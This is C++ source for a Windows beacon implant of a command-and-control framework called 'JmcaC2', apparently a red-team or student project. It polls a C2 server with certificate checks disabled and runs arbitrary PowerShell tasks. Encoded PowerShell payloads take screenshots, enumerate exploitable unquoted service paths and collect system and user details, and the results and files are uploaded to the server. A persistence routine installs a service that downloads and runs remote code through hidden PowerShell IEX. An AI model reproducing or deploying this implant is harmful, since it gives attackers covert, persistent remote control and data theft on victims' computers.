// Authors: Hudson and Isaac
// Date: 11/17/2025
// Description: Beacon client for JmcaC2
// Compile: g++ .\main.cpp -lwinhttp -lws2_32 -o beacon-client.exe
// Compile: cl  main.cpp /link ws2_32.lib winhttp.lib user32.lib;

#include "evasion.h"
#include "procInjection.h"
#include "common.h"
#include <vector>

using std::string;
namespace fs = std::filesystem;

int currentSleep = 10000;

const wchar_t *ACCEPTED_MIME_TYPES[] = {
    L"text/plain", L"application/octet-stream", L"text/html",
    L"multipart/form-data", NULL};

int CreateTCPConn();
bool sendHTTPTaskResult();
string runPSCommand(string command);
bool sendRequestedFile(const std::string &filePath);
string runEncodedPSCommand(string command);
string screenshot();
bool sendTaskResults(const std::string &data);

static std::wstring beaconName = L"";
string screenshot()
{
    string encodedCommand{"WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAVwBpAHQAaABQAGEAcgB0AGkAYQBsAE4AYQBtAGUAKAAiAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwAiACkAOwAkAGIAPQBbAEQAcgBhAHcAaQBuAGcALgBSAGUAYwB0AGEAbgBnAGwAZQBdADoAOgBGAHIAbwBtAEwAVABSAEIAKAAwACwAMAAsADEAMAAwADAALAA5ADAAMAApADsAJABiAG0AcAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABEAHIAYQB3AGkAbgBnAC4AQgBpAHQAbQBhAHAAKAAkAGIALgBXAGkAZAB0AGgALAAkAGIALgBIAGUAaQBnAGgAdAApADsAJABnAD0AWwBEAHIAYQB3AGkAbgBnAC4ARwByAGEAcABoAGkAYwBzAF0AOgA6AEYAcgBvAG0ASQBtAGEAZwBlACgAJABiAG0AcAApADsAJABnAC4AQwBvAHAAeQBGAHIAbwBtAFMAYwByAGUAZQBuACgAJABiAC4ATABvAGMAYQB0AGkAbwBuACwAWwBEAHIAYQB3AGkAbgBnAC4AUABvAGkAbgB0AF0AOgA6AEUAbQBwAHQAeQAsACQAYgAuAFMAaQB6AGUAKQA7ACQAYgBtAHAALgBTAGEAdgBlACgAIgBDADoAXABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AcABuAGcAIgApADsAJABnAC4ARABpAHMAcABvAHMAZQAoACkAOwAkAGIAbQBwAC4ARABpAHMAcABvAHMAZQAoACkAOwA="};
    char psBuffer[DEFAULT_PS_BUFLEN];
    string res;

    string powershellCommand =
        "powershell -NoProfile -NonInteractive -e \"" + encodedCommand + "\"";

    FILE *pPipe = _popen(powershellCommand.c_str(), "rt");

    if (!pPipe)
        return "ERROR";

    while (fgets(psBuffer, DEFAULT_PS_BUFLEN, pPipe))
    {
        res += psBuffer;
        puts(psBuffer); // THIS IS THE ONLY WAY TO GET STDOUT FIXME: NOT
                        // EVEN WHEN I COUT << RESULT
    }

    int exitCode = _pclose(pPipe);
    // runEncodedPSCommand(encodedCommand);
    sendRequestedFile("C:\\screenshot.png");
    return res;
}

bool runTask(string outBuffer, DWORD dwSize)
{
    printf("Running TASK: %.*s\n", dwSize, outBuffer.c_str());

    size_t pipePos = outBuffer.find('|');

    if (pipePos == string::npos)
        return false;

    string cmd = outBuffer.substr(0, pipePos);

    if (cmd == "powershell")
        runPSCommand(outBuffer.substr(pipePos + 1));
    else if (cmd == "enumservices")
    {
        string encodedCommand{
            "JABWAHUAbABuAFMAZQByAHYAaQBjAGUAcwAgAD0AIABnAHcAbQBpACAAdwBpAG4AMwAyAF8AcwBlAHIAdgBpAGMAZQAgAHwAIAA/AHsAJABfAH0AIAB8ACAAdwBoAGUAcgBlACAAewAoACQAXwAuAHAAYQB0AGgAbgBhAG0AZQAgAC0AbgBlACAAJABuAHUAbABsACkAIAAtAGEAbgBkACAAKAAkAF8ALgBwAGEAdABoAG4AYQBtAGUALgB0AHIAaQBtACgAKQAgAC0AbgBlACAAIgAiACkAfQAgAHwAIAB3AGgAZQByAGUAIAB7AC0AbgBvAHQAIAAkAF8ALgBwAGEAdABoAG4AYQBtAGUALgBTAHQAYQByAHQAcwBXAGkAdABoACgAIgBgACIAIgApAH0AIAB8ACAAdwBoAGUAcgBlACAAewAoACQAXwAuAHAAYQB0AGgAbgBhAG0AZQAuAFMAdQBiAHMAdAByAGkAbgBnACgAMAAsACAAJABfAC4AcABhAHQAaABuAGEAbQBlAC4ASQBuAGQAZQB4AE8AZgAoACIALgBlAHgAZQAiACkAIAArACAANAApACkAIAAtAG0AYQB0AGMAaAAgACIALgAqACAALgAqACIAfQA7ACAAaQBmACAAKAAkAFYAdQBsAG4AUwBlAHIAdgBpAGMAZQBzACkAIAB7ACAAZgBvAHIAZQBhAGMAaAAgACgAJABzAGUAcgB2AGkAYwBlACAAaQBuACAAJABWAHUAbABuAFMAZQByAHYAaQBjAGUAcwApAHsAIAAkAG8AdQB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEMAbwBsAGwAZQBjAHQAaQBvAG4AcwAuAFMAcABlAGMAaQBhAGwAaQB6AGUAZAAuAE8AcgBkAGUAcgBlAGQARABpAGMAdABpAG8AbgBhAHIAeQA7ACAAJABvAHUAdAAuAGEAZABkACgAIgBTAGUAcgB2AGkAYwBlAE4AYQBtAGUAIgAsACAAJABzAGUAcgB2AGkAYwBlAC4AbgBhAG0AZQApADsAIAAkAG8AdQB0AC4AYQBkAGQAKAAiAFAAYQB0AGgAIgAsACAAJABzAGUAcgB2AGkAYwBlAC4AcABhAHQAaABuAGEAbQBlACkAOwAgACQAbwB1AHQAIAB9ACAAfQA="};

        runEncodedPSCommand(encodedCommand);

        /*

        $script='$VulnServices = gwmi win32_service | ?{$_} | where
        {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | where
        {-not
        $_.pathname.StartsWith("`"")} | where {($_.pathname.Substring(0,
        $_.pathname.IndexOf(".exe") + 4)) -match ".* .*"}; if
        ($VulnServices) { foreach ($service in $VulnServices){ $out =
        New-Object System.Collections.Specialized.OrderedDictionary;
        $out.add("ServiceName", $service.name); $out.add("Path",
        $service.pathname); $out } }';
        [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))*/
    }
    else if (cmd == "screenshot")
        screenshot();
    else if (cmd == "sleep")
    {
        int seconds{};
        try
        {
            seconds = std::stoi(outBuffer.substr(pipePos + 1));
        }

        catch (const std::exception &e)
        {
            std::cout
                << "Error: " << e.what() << "\n";
        }

        currentSleep = seconds * 100000 ? seconds : currentSleep;
    }
    else if (cmd == "systemprofile")
    {
        string encodedCommand{"dwBoAG8AYQBtAGkAIAAvAHAAcgBpAHYAOwB3AGgAbwBhAG0AaQAgAC8AZwByAG8AdQBwAHMAOwBuAGUAdAAgAHUAcwBlAHIAOwBzAHkAcwB0AGUAbQBpAG4AZgBvADsAZwBlAHQALQBwAHIAbwBjAGUAcwBzADsAaQBwAGMAbwBuAGYAaQBnAA=="};
        // [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("whoami /priv;whoami /groups;net user;systeminfo;get-process;ipconfig"))
        runEncodedPSCommand(encodedCommand);
    }
    else if (cmd == "persistence")
    {
        string encodedCommand{"TgBlAHcALQBTAGUAcgB2AGkAYwBlACAALQBOAGEAbQBlACAAJwBQAGUAcgBzAGkAcwB0AGUAbgBjAGUAJwAgAC0AQgBpAG4AYQByAHkAUABhAHQAaABOAGEAbQBlACAAJwBDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQAgAC8AYwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0AbgBvAHAAIAAtAHcAIABoAGkAZABkAGUAbgAgAC0AYwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAwADoAOAAwADgAMAAvAG0AYQBpAG4ALgBlAHgAZQApACcAIAAtAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAgACcASgBtAGMAYQBDADIAUABlAHIAcwBpAHMAdABlAG4AYwBlACcAIAAtAFMAdABhAHIAdAB1AHAAVAB5AHAAZQAgAEEAdQB0AG8AbQBhAHQAaQBjAA=="};
        //  $cmd="New-Service -Name 'Persistence' -BinaryPathName 'C:\Windows\System32\cmd.exe /c powershell.exe -nop -w hidden -c IEX
        // (New-Object Net.WebClient).DownloadString(http://192.168.1.100:8080/main.exe)' -Description 'JmcaC2Persistence' -StartupType Automatic"
        // DELETE FOR TESTING : (Get-WmiObject -Class Win32_Service -Filter "Name='Persistence'").delete()
        runEncodedPSCommand(encodedCommand);
    }

    return true;
}

string runEncodedPSCommand(string command)
{
    char psBuffer[DEFAULT_PS_BUFLEN];
    string res;

    string powershellCommand =
        "powershell -NoProfile -NonInteractive -e \"" + command + "\"";

    FILE *pPipe = _popen(powershellCommand.c_str(), "rt");

    if (!pPipe)
        return "ERROR";

    while (fgets(psBuffer, DEFAULT_PS_BUFLEN, pPipe))
    {
        res += psBuffer;
        puts(psBuffer); // THIS IS THE ONLY WAY TO GET STDOUT FIXME: NOT
                        // EVEN WHEN I COUT << RESULT
    }

    int exitCode = _pclose(pPipe);

    sendTaskResults(res);

    return res;

    // TODO: Make this process injection?
}

bool fetchWinHTTPError(const char *msg)
{
    std::cout << msg << " failed: " << GetLastError() << "\n";
    return false;
}

bool fetchTasks(char **outBuffer, DWORD *dwSizeOut)
{
    // WinHTTP > WinINet

    /*WinHttpOpen -> WinHttpConnect (example.com) -> WinHttpOpenRequest   ->
    WinHttpSetOption (user-agent/content-type) ->
    WinHttpSendRequest -> WinHttpReadData -> TASK -> Close / cleanup*/

    // https://github.com/MicrosoftDocs/win32/blob/docs/desktop-src/WinHttp/winhttp-sessions-overview.md#using-the-winhttp-api-to-access-the-web

    HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
    bool isRequestSuccessful{}, didReceiveResponse{};

    if (!(hHTTPSession = WinHttpOpen(
              L"JmcaC2 Task Fetching", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)))
        return fetchWinHTTPError("WinHttpOpen");

    if (!(hHTTPConnection = WinHttpConnect(hHTTPSession, HTTP_SERVER_IP,
                                           (INTERNET_PORT)HTTP_SERVER_PORT, 0)))
        return fetchWinHTTPError("WinHttpOpen");

    if (!(hHTTPRequest = WinHttpOpenRequest(
              hHTTPConnection, L"GET", RESOURCE_NAME, NULL, WINHTTP_NO_REFERER,
              ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE)))
        return fetchWinHTTPError("WinHttpOpenRequest");

    std::cout << "Request Sent" << std::endl;

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

    if (!WinHttpSetOption(hHTTPRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags,
                          sizeof(flags)))
        return fetchWinHTTPError("WinHttpSetOption");

    std::wstring headerString;
    LPCWSTR headerPtr = WINHTTP_NO_ADDITIONAL_HEADERS;

    if (!beaconName.empty())
    {
        headerString = L"BeaconName: " + beaconName + L"\r\n";
        headerPtr = headerString.c_str();
    }

    // should be replaced if POST
    if (!(isRequestSuccessful =
              WinHttpSendRequest(hHTTPRequest, headerPtr, (DWORD)-1,
                                 WINHTTP_NO_REQUEST_DATA, 0, 0, 0)))
        return fetchWinHTTPError("WinHttpSendRequest");

    if (!(didReceiveResponse = WinHttpReceiveResponse(hHTTPRequest, NULL)))
        return fetchWinHTTPError("WinHttpReceiveResponse");

    // extract the beacon name from the response
    if (beaconName.empty())
    {
        DWORD size = 0;
        WinHttpQueryHeaders(hHTTPRequest, WINHTTP_QUERY_CUSTOM, L"BeaconName",
                            WINHTTP_NO_OUTPUT_BUFFER, &size,
                            WINHTTP_NO_HEADER_INDEX);

        // If size is 0, the header isn't present.
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
        {
            std::wstring buffer(size / sizeof(wchar_t),
                                L'\0'); // allocate correct size

            if (WinHttpQueryHeaders(hHTTPRequest, WINHTTP_QUERY_CUSTOM,
                                    L"BeaconName", &buffer[0], &size,
                                    WINHTTP_NO_HEADER_INDEX))
            {
                buffer.resize(
                    (size / sizeof(wchar_t))); // remove terminating null
                wprintf(L"Header value: %s\n", buffer.c_str());
                beaconName = buffer;
            }
        }
    }

    DWORD dwSize = 0;

    while (true)
    {
        if (!WinHttpQueryDataAvailable(hHTTPRequest, &dwSize) || !dwSize)
            break;
        char *responseBuf = new char[dwSize + 1];
        ZeroMemory(responseBuf, dwSize + 1);

        DWORD dwOut = 0;

        if (!WinHttpReadData(hHTTPRequest, responseBuf, dwSize, &dwOut))
        {
            delete[] responseBuf;
            break;
        }

        // append chunk to output
        char *newBuf = new char[*dwSizeOut + dwOut];

        if (*outBuffer != nullptr)
        {
            memcpy(newBuf, *outBuffer, *dwSizeOut);
            delete[] (*outBuffer);
        }

        memcpy(newBuf + *dwSizeOut, responseBuf, dwOut);

        *dwSizeOut += dwOut;
        newBuf[*dwSizeOut - 1] = '\0';
        *outBuffer = newBuf;
        delete[] responseBuf;
    }

    if (hHTTPRequest)
        WinHttpCloseHandle(hHTTPRequest);
    if (hHTTPConnection)
        WinHttpCloseHandle(hHTTPConnection);
    if (hHTTPSession)
        WinHttpCloseHandle(hHTTPSession);

    return didReceiveResponse;
}

bool sendRequestedFile(const std::string &filePath)
{
    HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
    bool isRequestSuccessful{}, didReceiveResponse{};

    if (!(hHTTPSession = WinHttpOpen(
              L"JmcaC2 Task Results", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)))
        return fetchWinHTTPError("WinHttpOpen");

    if (!(hHTTPConnection = WinHttpConnect(hHTTPSession, HTTP_SERVER_IP,
                                           (INTERNET_PORT)HTTP_SERVER_PORT, 0)))
        return fetchWinHTTPError("WinHttpOpen");

    if (!(hHTTPRequest = WinHttpOpenRequest(
              hHTTPConnection, L"POST", L"/upload", NULL, WINHTTP_NO_REFERER,
              ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE)))
        return fetchWinHTTPError("WinHttpOpenRequest");

    std::cout << "Request Sent" << std::endl;

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

    if (!WinHttpSetOption(hHTTPRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags,
                          sizeof(flags)))
        return fetchWinHTTPError("WinHttpSetOption");

    std::uintmax_t fileSize = std::filesystem::file_size(filePath);
    std::vector<char> fileBuf(fileSize);

    std::ifstream fin(filePath, std::ios::binary);
    fin.read(fileBuf.data(), fileSize);
    fin.close();

    fs::path fileNamePath = fs::path(filePath).filename();
    std::wstring fileName = fileNamePath.wstring();

    // Build headers
    std::wstring headerStr =
        L"BeaconName: " + beaconName + L"\r\n" + L"File-Name: " + fileName +
        L"\r\n" + L"File-Length: " + std::to_wstring(fileSize) + L"\r\n" +
        L"Content-Type: application/octet-stream\r\n" + L"Content-Length: " +
        std::to_wstring(fileSize) + L"\r\n";

    // Send request with no body yet
    if (!WinHttpSendRequest(hHTTPRequest, headerStr.c_str(), (DWORD)-1,
                            WINHTTP_NO_REQUEST_DATA, 0, (DWORD)fileSize, 0))
    {
        return fetchWinHTTPError("WinHttpSendRequest");
    }

    // Write raw file bytes
    DWORD bytesWritten = 0;
    if (!WinHttpWriteData(hHTTPRequest, fileBuf.data(), (DWORD)fileSize,
                          &bytesWritten))
    {
        return fetchWinHTTPError("WinHttpWriteData");
    }

    // Receive server response
    if (!WinHttpReceiveResponse(hHTTPRequest, nullptr))
    {
        return fetchWinHTTPError("WinHttpReceiveResponse");
    }

    // Cleanup
    if (hHTTPRequest)
        WinHttpCloseHandle(hHTTPRequest);
    if (hHTTPConnection)
        WinHttpCloseHandle(hHTTPConnection);
    if (hHTTPSession)
        WinHttpCloseHandle(hHTTPSession);

    return true;
}
bool sendTaskResults(const std::string &data)
{
    HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
    bool isRequestSuccessful{}, didReceiveResponse{};

    if (!(hHTTPSession = WinHttpOpen(
              L"JmcaC2 Task Results", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)))
        return fetchWinHTTPError("WinHttpOpen");

    if (!(hHTTPConnection = WinHttpConnect(hHTTPSession, HTTP_SERVER_IP,
                                           (INTERNET_PORT)HTTP_SERVER_PORT, 0)))
        return fetchWinHTTPError("WinHttpOpen");

    if (!(hHTTPRequest = WinHttpOpenRequest(
              hHTTPConnection, L"POST", RESOURCE_NAME, NULL, WINHTTP_NO_REFERER,
              ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE)))
        return fetchWinHTTPError("WinHttpOpenRequest");

    std::cout << "Request Sent" << std::endl;

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

    if (!WinHttpSetOption(hHTTPRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags,
                          sizeof(flags)))
        return fetchWinHTTPError("WinHttpSetOption");

    std::wstring headers = L"Content-Type: multipart/form-data\r\n";

    headers += L"BeaconName: " + beaconName + L"\r\n";

    // should be replaced if POST
    if (!(isRequestSuccessful = WinHttpSendRequest(
              hHTTPRequest, headers.c_str(), (DWORD)-1, (LPVOID)data.data(),
              (DWORD)data.size(), (DWORD)data.size(), 0)))
        return fetchWinHTTPError("WinHttpSendRequest");

    if (!(didReceiveResponse = WinHttpReceiveResponse(hHTTPRequest, NULL)))
        return fetchWinHTTPError("WinHttpReceiveResponse");

    DWORD dwSize = 0;

    if (hHTTPRequest)
        WinHttpCloseHandle(hHTTPRequest);
    if (hHTTPConnection)
        WinHttpCloseHandle(hHTTPConnection);
    if (hHTTPSession)
        WinHttpCloseHandle(hHTTPSession);

    return didReceiveResponse;
}

string runPSCommand(string command)
{
    char psBuffer[DEFAULT_PS_BUFLEN];
    string res;

    string powershellCommand =
        "powershell -NoProfile -NonInteractive -Command \"" + command + "\"";

    FILE *pPipe = _popen(powershellCommand.c_str(), "rt");

    if (!pPipe)
        return "ERROR";

    while (fgets(psBuffer, DEFAULT_PS_BUFLEN, pPipe))
    {
        res += psBuffer;
        puts(psBuffer); // THIS IS THE ONLY WAY TO GET STDOUT FIXME: NOT EVEN
                        // WHEN I COUT << RESULT
    }

    int exitCode = _pclose(pPipe);

    sendTaskResults(res);

    return res;

    // TODO: Make this process injection?
}

int main(int argc, const char **argv)
{
    // Run all checks
    // BOOL cpuOK = checkCPU();
    // BOOL ramOK = checkRAM();
    // BOOL hddOK = checkHDD();
    // BOOL processesOK = checkProcesses();

    // Check if all tests passed
    // if (!cpuOK || !ramOK || !hddOK || !processesOK) {
    //     return 0;
    // }

    char *outBuffer = nullptr;
    DWORD dwSize = 0;

    while (true)
    {
        if (fetchTasks(&outBuffer, &dwSize))
        {
            // TODO: parse tasks and do
            if (dwSize > 0)
            {
                runTask(outBuffer, dwSize);
                printf("TASK: %.*s\n", dwSize, outBuffer);
                delete[] outBuffer;
                outBuffer = nullptr;
                dwSize = 0;
            }
            // processInject();
            // runPSCommand(argv[1]);
            //  TODO: post results
        }

        Sleep(currentSleep);
    }

    return 0;
}